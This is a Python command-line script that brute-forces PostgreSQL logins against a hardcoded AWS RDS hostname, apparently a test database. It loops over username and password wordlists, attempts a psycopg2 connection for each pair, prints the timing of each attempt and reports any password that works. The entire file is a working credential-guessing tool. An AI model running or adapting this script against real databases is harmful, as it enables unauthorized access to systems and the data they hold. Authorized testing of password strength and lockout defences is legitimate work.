import psycopg2
import time
import argparse

host='postgre-db-test.c8ur2wv0ivpl.us-east-1.rds.amazonaws.com'
# users_file='users.txt'
users_file='passwords_8_len_short.txt'
passwords_file='passwords_8_len_short.txt'

def bruteforce(user, password):
    user_list= [user] if user else open(f'{users_file}',"r")
    password_list= [password] if password else open(f'{passwords_file}',"r")

    total_time = time.time()

    iterations=0
    for current_user in user_list:
        for current_password in password_list:
            # print(f'Testing password: {current_password}')
            iterations+=1
            try:
                trial_start=time.time()
                engine = psycopg2.connect(
                    database="postgres",
                    user=current_user,
                    password=current_password,
                    host=host,
                    port='5432'
                )
            except Exception as e:
                trial_elapsed = time.time() - trial_start
                print(f'Credentials {current_user}/{current_password} took {trial_elapsed}')
                continue
            
            trial_elapsed = time.time() - trial_start
            print(f'Found: {current_password}')
            print(f'Credentials {current_user}/{current_password} took {trial_elapsed}')
            # break

    total_elapsed = time.time() - total_time
    print(f'\nTotal bruteforcing time: {total_elapsed} for {iterations} trials')
    print(f'\nMean bruteforcing time: {total_elapsed/iterations}')

if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(description='Bruteforcer')
    parser.add_argument('-u','--user',
                        help="Fixed user to test",
                        default=None
                        )
    parser.add_argument('-p','--password',
                        help="Fixed pass to test",
                        default=None
                        )    
    options= parser.parse_args()       

    if options.user:
        print(f'Testing user: {options.user}')

    bruteforce(options.user, options.password)